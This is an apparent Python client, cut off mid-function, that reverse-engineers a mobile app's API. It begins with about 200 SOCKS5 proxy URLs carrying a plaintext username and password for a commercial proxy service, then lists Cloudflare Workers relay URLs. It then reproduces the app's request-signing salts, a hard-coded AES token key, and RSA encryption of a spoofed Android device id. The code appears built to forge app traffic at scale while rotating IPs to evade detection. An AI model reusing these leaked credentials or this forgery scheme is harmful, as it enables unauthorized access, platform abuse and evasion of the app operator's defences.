import asyncio
import base64
import hashlib
import random
import uuid
import time
import re

import aiohttp
try:
    import uvloop
    asyncio.set_event_loop_policy(uvloop.EventLoopPolicy())
except ImportError:
    pass
from Crypto.Cipher import AES, PKCS1_v1_5
from Crypto.Util.Padding import pad
from Crypto.PublicKey import RSA
from PyRoxy import ProxyChecker, ProxyUtiles
from aiohttp_socks import ProxyConnector

PROXY_WORK = proxy_list = [
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-0rk39qms:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-1tbqiu2v:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-2cb6p5i0:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-3scgnah3:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-40hnhim0:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-43kh2quh:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-4ykwpbb6:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-50jldpsn:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-75q2kzxm:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-8auj2xzb:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-8f4p068t:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-8wfdnodf:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-8xp2naeo:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-9n0h5qlr:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-a0dy8naa:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-atfy4hx7:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-bua1v4y7:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-ci4055vu:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-e0goizg9:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-e18et01t:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-fhfkfdy4:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-fkka734i:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-gc99zxzw:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-gvcy7a5t:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-j6hmqxmw:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-k979swuk:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-kkbsudxt:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-kpe9joaw:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-kxe28cb9:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-ky3jv5yi:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-mrvk9dnj:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-n573nyyw:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-nam52079:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-ng9uky3z:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-nu57kjrk:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-qmfhlm4c:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-r2xxe8rx:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-rg89p7m9:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-s6nckrky:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-suco4wc9:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-sxh6gtnd:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-tp6t86h8:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-ucph5q3d:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-vb8r92vt:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-vlqejjrc:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-x5dn3xuq:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-xniq1nbs:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-y5669ldn:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-zmz286a6:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-eu-sessid-zv8qaasa:Heroinwater9@eu.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-3giiu3s3:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-6fb0gxvt:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-73adf2oq:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-7jk1e8cl:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-c8qid4rv:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-c94zr51z:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-cg2olb21:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-d9bcd77u:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-dn9vvyki:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-dyqbd27p:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-f8bd92mg:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-fk1zv6ng:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-fxxfvd1y:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-fzp2g2cz:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-jxdz8szs:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-lwjfayhi:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-mkaqpg9m:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-mqhbh4er:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-mxg02sou:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-otsufmbe:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-oyw271xa:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-pkdm0l2a:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-qazfsonf:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-svpwf8t3:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-upem95nv:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-vjps31ml:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-vlgoftrt:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-walr6weh:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-x0ub3tfs:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-region-us-sessid-z3o45zyy:Heroinwater9@na.proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-03taiszx:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0a1db9qo:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0e4pmik3:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0m95bpxi:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0rro28xy:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0st8uhxk:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0ulxbvjj:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0v5tykjo:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-0z15ctyz:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-18g63xiv:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-1ns0t7a5:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-1xkha0fs:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-23k9ypf1:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-2421e4xf:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-25ph1he2:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-29abqzz9:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-2hv4hpwm:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-2nlbzhjz:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-2sixbjv2:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-331vcshz:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-36omofx1:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-36rcyp6c:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-3lpgx2ta:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-3x91gutm:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-4fobfsx8:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-4g4y0jqe:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-4s082qmx:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-5d34ohat:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-5kr5gq0j:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-5ms9qtrk:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-5r2okxgh:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-6g0yzs4p:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-6ufan44f:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-6ujtuu35:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-6v4bhrb6:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-73v48r86:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-794r515u:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-7gu5lg1l:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-7t7hc82c:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-7towod4c:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-7unu1fvz:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-8748x1d3:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-8otg7u30:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-8txgslb4:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-920p5wxf:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-9k9y1qh2:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-a18l6g02:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-a22qtt9s:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ahj76jqr:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-anwjwev1:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-aw0yey8a:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ayloo1kb:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-b2foh23d:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-bf339tbi:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-bkbhy1a8:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-bqzh4tww:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-c8ukf892:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-cgd262ek:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-cp3ldj7w:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-d1zgpzgx:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-d3fhk6om:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-d5174ux9:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-d6g6yjba:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-dgvqk3m1:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ds3mg66c:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-e9x49c1s:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ee38tb4k:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ehxcvok0:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ekeel3qw:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-enimrghp:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-fbwu478p:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-fqeiwcdm:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-fw9lmcf8:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-gans6lng:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-gf8orv5f:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-gkgv60sh:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-gvtnjwe5:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-hvo67dcj:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-i1al0p1u:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ib6hl1hu:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ibpul7j4:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-izvrwxmt:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-j65yjh3s:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-k5uyxq9d:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ka4ibou7:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-kop85qc7:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-kpkt7zrt:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-krkq4p01:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-l21n9mzo:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-l34822zn:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-l54l98ns:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ll2f26b1:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-lzzxyiqh:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-m3px0qai:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-mfvvzk6a:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-mgjj5e7u:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-mh1s4xbm:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-non5xgjn:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-nqdkuv14:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-nvnwe510:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-o9aofaxz:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-oa0b9i2f:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-os8jz8bx:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ox4nr0u6:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-p2v3xtzn:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-pdyxz7i1:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-penmeme3:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-phe8bkq6:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-pm6f0rn8:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-pnt2h8oh:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-pp4tfdyt:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-pxlkcbbo:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-q13wlo6m:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-qgoam8jj:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-qhdn37ln:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-qmt3ns5m:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-qxbugwad:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-r2balofj:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-rc2vp7v2:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-rgmonsp0:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-rw5tm2lh:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-sthr6n9m:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-swipfp7w:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-swtvbyek:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-sx4x93j7:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-tclgsxnc:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-terthfxj:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-tmoavpey:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-u28x8ctf:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ua7heupl:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-v2gzeqli:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-v8l5cfkq:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-v9l3upn6:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-vb5yh5v8:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-vpji6kpa:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-w52jowid:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-w7v557kz:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-wiatbkqn:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-wlnuyrqk:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-xh93ms7a:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-xirix9wg:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-xy07wish:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-yiw3gzkv:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-yuqhxo23:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-ywdf2wwt:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-yz8fkqp6:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-z3cbqpez:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-zih9xj66:Heroinwater9@proxy.piaproxy.com:7000",
    "socks5://user-HEROINWATER_D4hkN-sessid-zv463mj9:Heroinwater9@proxy.piaproxy.com:7000"
]
WORKERS = [
    "https://holy-cell-8ea5.xstee1zzbg.workers.dev/",
    "https://crimson-tree-1693.xstee1zzbg.workers.dev/",
    "https://small-dust-bced.xstee1zzbg.workers.dev/",
    "https://black-dawn-3927.xstee1zzbg.workers.dev/",
    "https://super-darkness-3c72.xstee1zzbg.workers.dev/",
    "https://quiet-violet-a7e0.xstee1zzbg.workers.dev/",
    "https://noisy-sky-21ec.xstee1zzbg.workers.dev/",
    "https://shy-surf-a223.xstee1zzbg.workers.dev/"
]

def get_xsign(path, nonce, time, params, android_id):
    md5 = hashlib.md5(f"6aDtpIdzQdgGwrpP6HzuPA{path}{nonce}{time}{params}9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s".encode()).hexdigest()

    if path in ENDPOINTS or (path.startswith("/config/files/") or path.startswith("/config/ml/files/")):
        return md5
    return hashlib.md5(f"{md5}{android_id}".encode()).hexdigest()

def get_enc_token(no_enc_token):
    data = pad(bytes(b ^ 0x73 for b in no_enc_token.encode()), 16)

    secret = hashlib.md5(b"9EuDKGtoWAOWoQH1cRng-d5ihNN60hkGLaRiaZTk-6s").hexdigest()

    cipher = AES.new(secret[:16].encode(), AES.MODE_ECB)
    return base64.b64encode(cipher.encrypt(data)).decode()

def get_enc_query(android_id, nonce):
    key = RSA.import_key(base64.b64decode("MIGfMA0GCSqGSIb3DQEBAQUAA4GNADCBiQKBgQCLzlsA+3wXCAph80r/xs1bWhVrsJSOQmSBTA0GaBpVIzXqFBaibDmYA3WJDM9rcQ7KpYSyrJ02iFlsN43RnizrHfS+xPtdwuxBQ2Clow5cYPZucqQYL9HIlbBLoighH2eGQqGlVadL7r384iKTz9mmckSUa8hhJzS+WwUAqVO3DwIDAQAB"))
    cipher = PKCS1_v1_5.new(key)
    query = f"0\n{android_id}\n{nonce}".encode()
    encrypted = b""
    for i in range(0, len(query), 117):
